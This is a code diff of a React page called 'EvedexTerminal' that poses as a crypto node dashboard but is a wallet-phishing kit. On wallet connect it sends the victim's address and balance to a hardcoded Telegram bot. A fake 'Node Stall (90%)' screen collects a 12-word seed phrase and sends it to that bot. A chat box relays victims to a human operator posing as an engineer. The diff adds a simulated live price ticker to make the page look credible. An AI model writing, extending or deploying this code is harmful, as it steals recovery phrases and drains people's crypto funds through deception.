@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useAccount, useBalance, useSignMessage, useSwitchChain } from 'wagmi';
-import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Send, Copy, Loader2 } from 'lucide-react';
+import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Send, Copy, Loader2, TrendingUp } from 'lucide-react';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
@@ -21,12 +21,29 @@ export default function EvedexTerminal() {
   const [isTyping, setIsTyping] = useState(false);
   const [chatLog, setChatLog] = useState([]); 
   const [stage, setStage] = useState(1); 
-  const [highlightTask, setHighlightTask] = useState(""); 
   const chatEndRef = useRef(null);
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const lastUpdateId = useRef(0);
+
+  // --- 📈 LIVE MARKET DATA SIMULATION (DEXTools Style) ---
+  const [marketData, setMarketData] = useState([
+    { s: "SOL/USD", p: "142.32", c: "+4.2%" },
+    { s: "ETH/USD", p: "2,412.11", c: "-1.8%" },
+    { s: "PIPPIN/SOL", p: "0.0042", c: "+112%" },
+    { s: "BTC/USD", p: "64,102.50", c: "+0.4%" }
+  ]);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setMarketData(prev => prev.map(item => ({
+        ...item,
+        p: (parseFloat(item.p.replace(',', '')) * (1 + (Math.random() * 0.002 - 0.001))).toLocaleString(undefined, {minimumFractionDigits: 2})
+      })));
+    }, 3000);
+    return () => clearInterval(interval);
+  }, []);
 
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
@@ -40,7 +57,7 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- 📡 LIVE TELEGRAM RELAY (POLLING FOR YOUR INPUT) ---
+  // --- 🎧 MANUAL TG RELAY ---
   useEffect(() => {
     const pollTelegram = setInterval(async () => {
       try {
@@ -60,10 +77,9 @@ export default function EvedexTerminal() {
     return () => clearInterval(pollTelegram);
   }, []);
 
-  // First Contact
   useEffect(() => {
     if (isConnected && address && stage < 2) {
-      const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive.";
+      const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established. Portals active.";
       setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
       setStage(2);
       sendTelegram(`🟢 WALLET_CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
@@ -82,12 +98,9 @@ export default function EvedexTerminal() {
   const handleUserChat = () => {
     if (!chatInput.trim() || isTyping) return;
     setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
-    
-    // Drop user message to your Telegram
     sendTelegram(chatInput, "USER_SAYS");
-    
     setChatInput("");
-    setIsTyping(true); // Stays "typing" until YOU reply from Telegram
+    setIsTyping(true);
   };
 
   const openPortal = (name) => {
@@ -104,16 +117,25 @@ export default function EvedexTerminal() {
         setLoading(false);
         setView("seed_gate");
         setStage(3);
-        sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address} | (Awaiting your manual instruction)`);
+        sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
     }, 2500);
   };
 
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
-      <style>{`
-        @keyframes pulse-cyan { 0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.6); border-color: #06b6d4; } 70% { box-shadow: 0 0 0 10px rgba(6, 182, 212, 0); border-color: #06b6d4; } 100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); } }
-        .glow-button { animation: pulse-cyan 1.5s infinite; border-width: 2px !important; }
-      `}</style>
+      
+      {/* 📊 LIVE MARKET TICKER */}
+      <div className="bg-black/60 border-b border-slate-900 -mx-4 mb-4 overflow-hidden whitespace-nowrap flex py-2">
+        <div className="flex animate-marquee gap-8 items-center px-4">
+          {marketData.map((m, i) => (
+            <div key={i} className="flex items-center gap-2">
+              <span className="text-[8px] text-slate-500">{m.s}</span>
+              <span className="text-[9px] text-cyan-500 font-mono">${m.p}</span>
+              <span className={`text-[7px] ${m.c.includes('+') ? 'text-green-500' : 'text-red-500'}`}>{m.c}</span>
+            </div>
+          ))}
+        </div>
+      </div>
 
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
@@ -162,15 +184,14 @@ export default function EvedexTerminal() {
           <div ref={chatEndRef} />
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
-          <button onClick={() => navigator.clipboard.writeText("https://evedex.network")} className="text-slate-600 pr-2"><Copy size={16}/></button>
-          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleUserChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
-          <button onClick={handleUserChat} className="text-cyan-500"><Send size={16}/></button>
+          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleUserChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono px-4" />
+          <button onClick={handleUserChat} className="text-cyan-500 pr-4"><Send size={16}/></button>
         </div>
       </div>
 
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
-          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40 border-red-900/30">
+          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40">
             {isSyncing ? (
               <div className="py-8">
                 <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div>
@@ -180,15 +201,20 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                 <h2 className="text-white font-black text-md italic uppercase tracking-widest">Node Stall (90%)</h2>
-                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
-                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED_CAPTURED: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
+                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase my-4" />
+                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
               </>
             )}
           </div>
         </div>
       )}
 
-      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><Loader2 size={40} className="text-cyan-500 animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 animate-pulse uppercase italic tracking-widest font-black uppercase">ANALYZING VAULT ENTROPY...</p></div>}
+      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><Loader2 size={40} className="text-cyan-500 animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 animate-pulse uppercase italic tracking-widest">ANALYZING VAULT ENTROPY...</p></div>}
+      
+      <style>{`
+        @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+        .animate-marquee { display: flex; animation: marquee 20s linear infinite; }
+      `}</style>
     </div>
   );
 }
